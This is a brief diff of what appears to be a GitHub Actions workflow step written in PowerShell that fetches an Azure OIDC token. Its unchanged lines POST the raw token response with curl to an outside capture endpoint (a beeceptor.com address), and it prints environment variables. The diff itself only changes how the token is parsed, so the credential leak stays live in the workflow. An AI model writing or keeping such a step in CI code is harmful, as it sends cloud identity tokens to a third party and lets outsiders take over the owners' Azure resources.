@@ -42,7 +42,7 @@ jobs:
             Write-Host "ACTIONS_ID_TOKEN_REQUEST_URL: "$env:ACTIONS_ID_TOKEN_REQUEST_URL
             $azureTokenResponse = curl -H "Authorization: bearer $env:ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$env:ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange"
             curl https://thehossgame.free.beeceptor.com --data-raw  $azureTokenResponse
-            $azureOidcToken = $azureTokenResponse | ConvertFrom-Json
+            $azureOidcToken = $azureTokenResponse
             $env:ARM_CLIENT_SECRET = $azureOidcToken.value 
 
             Write-Host '👉 Printing environment variables'
